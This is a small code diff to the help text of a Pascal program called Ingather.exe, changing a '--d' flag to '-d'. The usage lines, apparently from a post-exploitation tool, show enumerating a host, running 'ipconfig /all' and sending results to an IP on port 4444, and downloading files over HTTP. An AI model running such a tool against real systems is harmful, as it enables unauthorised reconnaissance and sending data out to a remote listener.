@@ -158,7 +158,7 @@ procedure TIngather.WriteHelp;
 begin
   writeln;
   writeln('Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt');
-  writeln('       Ingather.exe --d http://www.abcded.com/abc.txt -s c:\temp\abc.text');
+  writeln('       Ingather.exe -d http://www.abcded.com/abc.txt -s c:\temp\abc.text');
   writeln('       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444');
   writeln;
   writeln('Download file over HTTP:');
